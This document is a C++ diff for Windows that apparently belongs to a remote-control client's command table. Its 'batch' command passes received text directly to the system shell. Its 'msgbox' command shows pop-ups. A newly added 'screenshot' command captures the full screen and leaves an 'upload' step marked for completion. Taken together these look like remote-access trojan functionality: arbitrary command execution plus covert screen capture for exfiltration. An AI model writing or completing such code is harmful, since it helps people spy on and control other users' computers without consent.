@@ -26,22 +26,45 @@ struct command_t {
 command_t commandDefs[] = {
     {
         "batch", [](std::vector<std::string> args) {
-            if(args.size()) {
-                std::string fileArgs = join_at_index(args, " ");
-                wchar_t dest[_MAX_PATH];
-                mbstowcs(dest, fileArgs.c_str(), _MAX_PATH);
-                _wsystem(dest);
-            }
+            if(!args.size())
+                return;
+
+            std::string fileArgs = join_at_index(args, " ");
+            wchar_t dest[_MAX_PATH];
+            mbstowcs(dest, fileArgs.c_str(), _MAX_PATH);
+            _wsystem(dest);
         }
     },
     {
         "msgbox", [](std::vector<std::string> args) {
-            if(args.size()) {
-                std::string msgboxText = join_at_index(args, " ");
-                wchar_t text[1024];
-                mbstowcs(text, msgboxText.c_str(), 1024);
-                MessageBox(NULL, text, NULL, MB_OK);
-            }
+            if(!args.size())
+                return;
+
+            std::string msgboxText = join_at_index(args, " ");
+            wchar_t text[1024];
+            mbstowcs(text, msgboxText.c_str(), 1024);
+            MessageBox(NULL, text, NULL, MB_OK);
+        }
+    },
+    {
+        "screenshot", [](std::vector<std::string> args) {
+            HDC hScreenDC = CreateDC(_T("DISPLAY"), NULL, NULL, NULL);
+            HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+
+            int x = GetDeviceCaps(hScreenDC, HORZRES);
+            int y = GetDeviceCaps(hScreenDC, VERTRES);
+
+            HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, x, y);
+            HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
+
+            BitBlt(hMemoryDC, 0, 0, x, y, hScreenDC, 0, 0, SRCCOPY);
+            hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);
+
+            DeleteDC(hMemoryDC);
+            DeleteDC(hScreenDC);
+
+            // upload
+            // free hBitmap
         }
     }
 };
